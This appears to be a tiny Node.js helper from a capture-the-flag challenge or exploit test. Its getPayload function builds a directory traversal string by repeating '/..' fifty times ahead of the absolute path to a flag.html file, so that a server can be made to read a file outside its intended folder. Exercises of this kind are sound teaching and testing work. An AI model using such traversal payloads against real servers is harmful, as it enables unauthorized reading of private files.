const path = require("path");  // Import the path module

function getPayload() {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  return "/..".repeat(50) + pathToFlag;
}

module.exports = { getPayload };